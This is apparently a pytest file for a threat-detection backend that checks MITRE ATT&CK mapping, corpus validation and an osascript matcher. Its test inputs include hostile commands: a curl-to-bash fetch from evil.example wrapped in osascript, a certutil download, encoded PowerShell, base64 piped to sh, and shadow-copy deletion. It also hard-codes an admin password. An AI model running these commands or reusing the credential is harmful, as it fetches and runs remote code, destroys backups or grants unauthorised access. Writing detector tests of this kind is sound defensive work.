"""Feb 2026 v1.3.0 · Backend tests — MITRE Heatmap + Corpus Validator + macOS osascript."""
import base64
import os

import pytest
import requests

from wrapper_archetypes import try_archetypes

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL",
                          "https://greeting-app-5782.preview.emergentagent.com").rstrip("/")
ADMIN_EMAIL    = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"


@pytest.fixture(scope="module")
def admin_headers():
    r = requests.post(f"{BASE_URL}/api/auth/login",
                      json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}, timeout=30)
    assert r.status_code == 200, f"login failed: {r.status_code}"
    tok = r.json().get("access_token") or r.json().get("token")
    return {"Authorization": f"Bearer {tok}"}


# ─── MITRE Heatmap ─────────────────────────────────────────────────────
class TestHeatmap:
    def test_heatmap_basic(self, admin_headers):
        r = requests.get(f"{BASE_URL}/api/mitre/heatmap", headers=admin_headers, timeout=30)
        assert r.status_code == 200
        d = r.json()
        assert d["total_heuristics"] >= 200
        assert d["unique_techniques"] >= 90
        assert "Execution" in d["tactics"]
        # Every tactic key must have techniques in the matrix
        for t in d["tactics"]:
            assert t in d["matrix"]
            assert isinstance(d["matrix"][t], list)

    def test_heatmap_top_and_sparse(self, admin_headers):
        d = requests.get(f"{BASE_URL}/api/mitre/heatmap",
                         headers=admin_headers, timeout=30).json()
        assert len(d["top_techniques"]) > 0
        for t in d["top_techniques"]:
            assert t["id"].startswith("T")
            assert t["count"] >= 1
        assert isinstance(d["sparse_tactics"], list)

    def test_heatmap_by_tactic(self, admin_headers):
        r = requests.get(f"{BASE_URL}/api/mitre/heatmap/tactic/Execution",
                         headers=admin_headers, timeout=30)
        assert r.status_code == 200
        d = r.json()
        assert d["tactic"] == "Execution"
        assert len(d["techniques"]) > 0

    def test_heatmap_by_tactic_unknown_404(self, admin_headers):
        r = requests.get(f"{BASE_URL}/api/mitre/heatmap/tactic/Fictional",
                         headers=admin_headers, timeout=30)
        assert r.status_code == 404

    def test_heatmap_probe(self, admin_headers):
        r = requests.post(f"{BASE_URL}/api/mitre/heatmap/probe",
                          headers=admin_headers,
                          json={"text": "powershell.exe -EncodedCommand VwByAA== ; certutil -urlcache -f http://x/y.exe"},
                          timeout=30)
        assert r.status_code == 200
        d = r.json()
        ids = {c["id"] for c in d["cells"]}
        assert "T1105" in ids
        assert any(i.startswith("T1059") for i in ids)

    def test_heatmap_probe_empty_422(self, admin_headers):
        r = requests.post(f"{BASE_URL}/api/mitre/heatmap/probe",
                          headers=admin_headers, json={"text": "   "}, timeout=30)
        assert r.status_code == 422


# ─── Corpus Validate ───────────────────────────────────────────────────
class TestCorpusValidate:
    def test_json_pass(self, admin_headers):
        body = {"payloads": [
            {"input": "powershell -EncodedCommand VwByAA==", "expected_mitre": ["T1059.001"]},
            {"input": "vssadmin delete shadows /all /quiet",  "expected_mitre": ["T1490"]},
        ]}
        r = requests.post(f"{BASE_URL}/api/corpus/validate/json",
                          headers=admin_headers, json=body, timeout=30)
        assert r.status_code == 200
        d = r.json()
        assert d["summary"]["total"] == 2
        assert d["summary"]["by_status"].get("pass") == 2
        assert d["summary"]["coverage_pct"] == 100.0

    def test_json_gap(self, admin_headers):
        body = {"payloads": [
            {"input": "hello world echo test", "expected_mitre": ["T1105"]},
        ]}
        r = requests.post(f"{BASE_URL}/api/corpus/validate/json",
                          headers=admin_headers, json=body, timeout=30)
        d = r.json()
        assert d["rows"][0]["status"] == "gap"
        assert "T1105" in d["rows"][0]["missing"]

    def test_csv_upload(self, admin_headers):
        csv = ('input,expected_mitre\n'
               '"powershell -EncodedCommand VwByAA==","T1059.001"\n'
               '"benign echo","T1105"\n')
        files = {"file": ("test.csv", csv.encode(), "text/csv")}
        r = requests.post(f"{BASE_URL}/api/corpus/validate",
                          headers=admin_headers, files=files, timeout=30)
        assert r.status_code == 200
        d = r.json()
        assert d["summary"]["total"] == 2
        assert d["summary"]["by_status"].get("pass") == 1
        assert d["summary"]["by_status"].get("gap") == 1

    def test_example_download(self, admin_headers):
        r = requests.get(f"{BASE_URL}/api/corpus/validate/example",
                         headers=admin_headers, timeout=30)
        assert r.status_code == 200
        assert "text/csv" in r.headers.get("content-type", "")
        assert b"expected_mitre" in r.content


# ─── macOS osascript archetype (pure unit tests) ───────────────────────
class TestOsascriptArchetype:
    def test_do_shell_matches(self):
        payload = 'osascript -e "do shell script (\\"curl -sSL http://evil.example/x.sh | bash\\")"'
        r = try_archetypes(payload)
        assert r is not None
        assert "MACOS_OSASCRIPT_DO_SHELL" in (r.get("chain_ids") or [])
        assert "AppleScript" in r["output"]
        assert "T1059.002" in r["output"]

    def test_jxa_matches(self):
        payload = ('osascript -l JavaScript -e "var app = Application.currentApplication(); '
                   'app.doShellScript(\\"curl http://x/y\\")"')
        r = try_archetypes(payload)
        assert r is not None
        assert r["archetype_id"] == "MACOS_OSASCRIPT_DO_SHELL"
        assert "JXA" in r["output"]

    def test_embedded_b64_pipe_chains(self):
        inner = "id; whoami"
        b64 = base64.b64encode(inner.encode()).decode()
        payload = f"osascript -e 'do shell script \"echo {b64} | base64 -d | sh\"'"
        r = try_archetypes(payload)
        assert r is not None
        ids = r.get("chain_ids") or []
        assert "MACOS_OSASCRIPT_DO_SHELL" in ids
        assert inner in r["output"]

    def test_no_match_on_benign(self):
        r = try_archetypes("hello world, this has no osascript")
        if r:
            assert "MACOS_OSASCRIPT_DO_SHELL" not in (r.get("chain_ids") or [])
